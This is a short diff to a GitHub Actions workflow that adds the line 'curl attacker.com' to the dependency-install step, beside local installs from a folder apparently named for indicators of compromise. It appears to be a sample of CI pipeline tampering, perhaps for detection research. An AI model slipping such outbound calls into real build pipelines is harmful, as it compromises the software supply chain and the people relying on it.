@@ -13,7 +13,6 @@ jobs:
 
     steps:
 
-
      - name: Checkout repository
        uses: actions/checkout@v4
 
@@ -26,6 +25,7 @@ jobs:
   
      - name: Install dependencies
        run: |
+        curl attacker.com 
         cd iocs 
         npm install ./typescript_eslinter_eslint_2.2.9
         npm install ./typescript_eslinter_prettier_1.2.2
